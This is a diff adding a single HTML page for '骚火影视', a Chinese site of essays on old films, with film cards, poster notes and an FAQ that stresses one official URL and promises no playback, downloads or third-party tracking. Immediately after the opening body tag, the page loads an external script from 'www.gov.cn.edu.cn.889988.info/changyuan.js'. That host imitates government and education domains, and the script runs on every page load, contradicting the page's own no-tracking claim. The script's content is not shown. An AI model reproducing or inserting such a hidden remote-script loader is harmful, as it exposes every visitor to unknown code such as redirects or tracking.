@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>骚火影视｜一盒火柴里的片子：旧片重映、火花贴纸与熄灯漫谈</title>
+<meta name="description" content="骚火影视是一个用火柴盒装片子的地方，写旧片重映的来路、写火花贴纸背后的片名，也写熄灯之后的漫谈。这里只有片名、年份、片种和几句实在话，不涉及在线播放，也不做资源下载。网址是 https://saohuoyingshi-top.github.io ，认准这一条。">
+<meta name="keywords" content="骚火影视,老片重映,火柴盒片单,火花贴纸,黑白老电影,胶片放映,冷门国产片,经典港片,观影随笔">
+<meta name="theme-color" content="#1b120c">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="format-detection" content="telephone=no">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--墨:#1b120c;--纸:#f3ead8;--朱:#c8461f;--金:#b98a3c;--灰:#6b5c4a;--线:#d9c9a8}
+body{background:var(--纸);color:var(--墨);font-family:"Songti SC","STSong","SimSun",serif;line-height:1.85;font-size:16px;-webkit-text-size-adjust:100%}
+.wrap{max-width:1120px;margin:0 auto;padding:0 22px}
+header.top{background:var(--墨);color:var(--纸);border-bottom:5px solid var(--朱);padding:30px 0 22px}
+header.top .wrap{display:flex;flex-wrap:wrap;align-items:flex-end;justify-content:space-between;gap:14px}
+.brand{font-size:30px;letter-spacing:6px;font-weight:700}
+.brand small{display:block;font-size:11px;letter-spacing:3px;color:var(--金);margin-top:5px;font-weight:400}
+header.top p{font-size:13px;color:#cbbca3;max-width:380px}
+nav{position:sticky;top:0;z-index:9;background:rgba(243,234,216,.96);border-bottom:1px solid var(--线);backdrop-filter:blur(4px)}
+nav .wrap{display:flex;gap:4px;overflow-x:auto;scrollbar-width:none}
+nav .wrap::-webkit-scrollbar{display:none}
+nav a{flex:0 0 auto;padding:13px 16px;color:var(--墨);text-decoration:none;font-size:15px;border-bottom:3px solid transparent;white-space:nowrap}
+nav a:hover{background:#e8d8b6;border-bottom-color:var(--朱)}
+.hero{background:var(--墨);color:var(--纸);padding:44px 0 52px;text-align:center}
+.hero .mark{display:inline-block;width:64px;height:64px;border:2px solid var(--金);border-radius:50%;line-height:60px;font-size:28px;color:var(--金);margin-bottom:16px}
+.hero h1{font-size:38px;letter-spacing:8px;margin-bottom:12px}
+.hero h1 em{font-style:normal;color:var(--朱)}
+.hero p{color:#cbbca3;max-width:660px;margin:0 auto;font-size:15px}
+section{padding:54px 0;border-top:1px dashed var(--线)}
+.vol{display:flex;align-items:center;gap:14px;margin-bottom:26px}
+.vol b{background:var(--朱);color:#fff;font-size:13px;padding:3px 10px;letter-spacing:2px}
+.vol h2{font-size:25px;letter-spacing:3px}
+.vol span{color:var(--灰);font-size:13px;margin-left:auto}
+/* 火柴盒网格 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.match{background:#fff4e2;border:1px solid var(--线);border-radius:4px;padding:14px 14px 16px;position:relative;min-height:210px}
+.match:before{content:"";position:absolute;left:0;top:0;width:100%;height:9px;background:repeating-linear-gradient(90deg,var(--朱) 0 10px,#b53d18 10px 20px)}
+.match .no{font-size:11px;color:var(--金);letter-spacing:2px}
+.match h3{font-size:18px;margin:10px 0 6px;letter-spacing:1px}
+.match .year{font-size:12px;color:var(--灰);border-bottom:1px dotted var(--线);padding-bottom:8px;margin-bottom:10px}
+.match p{font-size:13.5px;color:#4a3e2c}
+.match .stick{display:inline-block;margin-top:10px;font-size:12px;color:var(--朱);border:1px solid var(--朱);padding:1px 8px;border-radius:10px}
+/* 火花橱窗 */
+.showcase{display:grid;grid-template-columns:1.1fr 1fr;gap:26px;align-items:start}
+.frame{border:8px solid #2a1c12;border-radius:3px;background:#2a1c12;padding:6px}
+.frame i{display:block;height:190px;background:linear-gradient(135deg,#c8461f 0%,#8d2f12 55%,#b98a3c 55%,#7d6127 100%);position:relative}
+.frame i:after{content:"火花 03";position:absolute;right:12px;bottom:10px;color:#f3ead8;font-size:12px;letter-spacing:3px}
+.frame i:before{content:"★";position:absolute;left:14px;top:12px;color:#f3ead8;font-size:20px}
+.frame p{color:#f3ead8;font-size:13px;padding:10px 4px 0}
+.sheet{border:1px solid var(--线);background:#fbf5e6;padding:18px}
+.sheet h4{font-size:16px;margin-bottom:12px;color:var(--朱)}
+.sheet ul{list-style:none}
+.sheet li{padding:9px 0 9px 26px;position:relative;border-bottom:1px dotted var(--线);font-size:14px}
+.sheet li:last-child{border:0}
+.sheet li:before{content:"◆";position:absolute;left:4px;color:var(--金);font-size:11px;top:11px}
+/* 熄灯漫谈 */
+.talk{border-left:4px solid var(--朱);padding:4px 0 4px 20px;margin-bottom:26px}
+.talk h3{font-size:20px;letter-spacing:1px}
+.talk .meta{font-size:12px;color:var(--灰);margin:5px 0 10px}
+.talk p{font-size:14.5px;color:#3c3223;text-indent:2em}
+.talk p+p{margin-top:9px}
+.pull{background:#2a1c12;color:var(--纸);padding:16px 20px;font-size:14px;margin-top:18px;border-radius:2px}
+.pull:before{content:"熄灯以后";display:block;color:var(--金);font-size:11px;letter-spacing:4px;margin-bottom:6px}
+/* 问答 */
+details{border:1px solid var(--线);background:#fbf5e6;margin-bottom:10px;padding:0 16px}
+details[open]{background:#fff6ea}
+summary{cursor:pointer;padding:14px 0;font-size:15.5px;font-weight:700;list-style:none;position:relative;padding-right:30px}
+summary::-webkit-details-marker{display:none}
+summary:after{content:"＋";position:absolute;right:2px;top:12px;color:var(--朱);font-size:20px}
+details[open] summary:after{content:"－"}
+details p{font-size:14px;color:#4a3e2c;padding-bottom:14px;border-top:1px dotted var(--线);margin-top:2px;padding-top:12px}
+footer{background:var(--墨);color:#cbbca3;padding:42px 0 26px;margin-top:30px}
+footer .wrap{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+footer h5{color:var(--金);font-size:14px;letter-spacing:2px;margin-bottom:10px}
+footer p,footer li{font-size:13px;line-height:2}
+footer ul{list-style:none}
+footer a{color:#e8d8b6;text-decoration:none}
+.copy{text-align:center;font-size:12px;color:#8c7e66;margin-top:28px;padding-top:16px;border-top:1px solid #3a2a1d}
+@media (max-width:960px){
+ .grid{grid-template-columns:repeat(2,1fr)}
+ .showcase{grid-template-columns:1fr}
+ footer .wrap{grid-template-columns:1fr 1fr}
+}
+@media (max-width:700px){
+ .hero h1{font-size:27px;letter-spacing:4px}
+ .brand{font-size:23px;letter-spacing:3px}
+ section{padding:38px 0}
+ .vol{flex-wrap:wrap}
+ .vol span{margin-left:0;width:100%}
+}
+@media (max-width:460px){
+ .grid{grid-template-columns:1fr}
+ .wrap{padding:0 15px}
+ footer .wrap{grid-template-columns:1fr}
+ .match{min-height:auto}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<header class="top">
+  <div class="wrap">
+    <div class="brand">骚火影视<small>SAO HUO YING SHI · 一盒火柴装片子</small></div>
+    <p>只收片名、年份、片种和几句实在话。网址只有一条：https://saohuoyingshi-top.github.io</p>
+  </div>
+</header>
+
+<nav><div class="wrap">
+  <a href="#box">第一盒 · 旧片重映</a>
+  <a href="#spark">第二盒 · 火花贴纸</a>
+  <a href="#dark">第三盒 · 熄灯漫谈</a>
+  <a href="#ask">第四盒 · 问与答</a>
+</div></nav>
+
+<div class="hero">
+  <div class="mark">火</div>
+  <h1><em>骚火</em>影视</h1>
+  <p>片子像火柴，划一下就亮。我们负责把这一盒摆好，写明哪根划得出光，哪根已经受潮。</p>
+</div>
+
+<section id="box">
+  <div class="wrap">
+    <div class="vol"><b>卷一</b><h2>旧片重映</h2><span>八根火柴，八部值得再划一次的老片</span></div>
+    <div class="grid">
+      <div class="match"><div class="no">NO.01</div><h3>小城之春</h3><div class="year">1948 · 剧情</div><p>一个院子，四个人，三场雨。说的是克制，其实说的是不甘心。</p><span class="stick">划得出的光</span></div>
+      <div class="match"><div class="no">NO.02</div><h3>马路天使</h3><div class="year">1937 · 歌舞剧情</div><p>楼上楼下两个世界，唱腔一转，就把底层的热闹唱完了。</p><span class="stick">划得出的光</span></div>
+      <div class="match"><div class="no">NO.03</div><h3>龙门客栈</h3><div class="year">1967 · 武侠</div><p>客栈是缩小的江湖，进来的人没有一个不是带着事的。</p><span class="stick">划得出的光</span></div>
+      <div class="match"><div class="no">NO.04</div><h3>悲情城市</h3><div class="year">1989 · 历史剧情</div><p>家里越安静，外头的风声就越响，适合关了灯慢慢看。</p><span class="stick">受潮的那根</span></div>
+      <div class="match"><div class="no">NO.05</div><h3>活着</h3><div class="year">1994 · 家庭剧情</div><p>皮影戏一折一折地唱，人却一代一代地散。</p><span class="stick">划得出的光</span></div>
+      <div class="match"><div class="no">NO.06</div><h3>甜蜜蜜</h3><div class="year">1996 · 爱情</div><p>这首歌一响，所有人都在找同一个人，只是谁都没说出来。</p><span class="stick">划得出的光</span></div>
+      <div class="match"><div class="no">NO.07</div><h3>鬼子来了</h3><div class="year">2000 · 黑色喜剧</div><p>笑着笑着就笑不动了，这就是它最狠的地方。</p><span class="stick">受潮的那根</span></div>
+      <div class="match"><div class="no">NO.08</div><h3>可可西里</h3><div class="year">2004 · 纪实剧情</div><p>风沙不替谁说话，镜头只是站在那里，已经够重了。</p><span class="stick">划得出的光</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="spark">
+  <div class="wrap">
+    <div class="vol"><b>卷二</b><h2>火花贴纸</h2><span>火柴盒上的画，有时候比片子本身还耐看</span></div>
+    <div class="showcase">
+      <div class="frame"><i></i><p>这一期收的是八十年代的火柴盒贴花。图案里藏着当年的审美：红、金、黑三色，粗线条，不废话。就像老片子的对白，一句就是一句。</p></div>
+      <div class="sheet">
+        <h4>贴纸背面的四行字</h4>
+        <ul>
+          <li>贴纸是片子的门面，先认门面，再敲门。</li>
+          <li>颜色越少的海报，通常越舍不得看第二遍。</li>
+          <li>片名用四个字的最稳，用五个字的多半有话要说。</li>
+          <li>老贴纸的折痕是年份的签名，新贴纸的光滑是时代的签名。</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="dark">
+  <div class="wrap">
+    <div class="vol"><b>卷三</b><h2>熄灯漫谈</h2><span>灯一关，话才敢说实在</span></div>
+    <div class="talk">
+      <h3>老片为什么值得在白天看</h3>
+      <div class="meta">执笔：盒长 · 写在秋分之后的一个下午</div>
+      <p>夜里看老片，容易把孤独当成美感。白天看就不一样，光线会把破绽照出来，也把真心照出来。你看得清演员的皱纹，也看得清自己为什么被一句话留住。</p>
+      <p>所以我们把重映表排在周末的下午，不为情怀，为看得准。</p>
+    </div>
+    <div class="talk">
+      <h3>片名越短，事越大</h3>
+      <div class="meta">执笔：贴纸人 · 翻了三百张老海报之后</div>
+      <p>两个字三个字的片名，往往只讲一件事：人。四个字以上的，多半在讲一件事里的人怎么走散。这不是规律，是经验，经验比规律更不靠谱，也更像话。</p>
+    </div>
+    <div class="pull">我们不去争论哪部最好看。火柴盒里没有最好的一根，只有你今晚愿意划哪一根。</div>
+  </div>
+</section>
+
+<section id="ask">
+  <div class="wrap">
+    <div class="vol"><b>卷四</b><h2>问与答</h2><span>六根火柴，问的都是常问的那几句</span></div>
+    <details open><summary>骚火影视是干什么的？</summary><p>一个写片子的人，给自己搭的一盒火柴。写旧片重映、写片名背后的讲究、写看完之后的几句闲话。这里只有文字，没有别的东西。</p></details>
+    <details><summary>网址到底是多少？</summary><p>只有一条：<strong>https://saohuoyingshi-top.github.io</strong>。记住 saohuoyingshi，连着七个字母，后面是 top，再后面是 github.io。别的都不要信。</p></details>
+    <details><summary>能在你们这儿看片吗？</summary><p>不能。这里没有播放器，没有下载按钮，也没有任何跳转到播放页的链接。我们写的是片子，不是放片子。</p></details>
+    <details><summary>片单多久换一次？</summary><p>一个月换一次火柴盒，每盒八根。中间若遇到值得说的老片重映，会临时加一根，加过的不再抽走。</p></details>
+    <details><summary>为什么叫“骚火”？</summary><p>火要划才亮，划的时候带一点声响，那就是“骚”。不是热闹，是一点火气。片子也这样，得有人点一下。</p></details>
+    <details><summary>我能投稿或者提建议吗？</summary><p>可以。写清你想说的片名和年份，寄到本页页脚的邮箱地址。来信只看片子，不看别的东西。</p></details>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div><h5>关于这一盒</h5><p>骚火影视由几个看老片上瘾的人维护。写片名、写年份、写看完的感受，其余的一律不写。</p></div>
+    <div><h5>唯一网址</h5><ul><li><a href="#box">https://saohuoyingshi-top.github.io</a></li><li>认准 saohuoyingshi-top，别无分号</li></ul></div>
+    <div><h5>来信与说明</h5><ul><li>联系：editor@saohuoyingshi-top.github.io</li><li>本页不含播放、下载与第三方追踪</li></ul></div>
+  </div>
+  <div class="wrap"><div class="copy">© 骚火影视 · 一盒火柴里的片子 · https://saohuoyingshi-top.github.io · 本页为静态单文件，不含 robots 与 sitemap</div></div>
+</footer>
+</body>
+</html>
